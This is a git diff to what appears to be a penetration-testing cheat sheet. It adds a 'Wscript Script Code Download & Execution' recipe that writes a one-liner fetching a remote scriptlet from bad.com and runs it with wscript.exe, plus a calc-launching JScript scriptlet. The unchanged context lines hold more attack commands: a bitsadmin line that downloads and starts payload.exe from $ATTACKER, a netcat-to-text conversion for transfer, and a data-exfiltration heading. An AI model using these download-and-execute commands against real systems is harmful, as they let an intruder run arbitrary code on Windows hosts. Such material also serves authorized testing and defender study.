@@ -620,6 +620,31 @@ wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
 ```
 
+#### Wscript Script Code Download & Execution
+
+{% code-tabs %}
+{% code-tabs-item title="cmd" %}
+```text
+echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
+```
+{% endcode-tabs-item %}
+
+{% code-tabs-item title="code.js" %}
+```markup
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+    <![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
+    ]]>
+</script>
+</component>
+</package>
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
 ### Whois Data Exfiltration
 
 ```bash
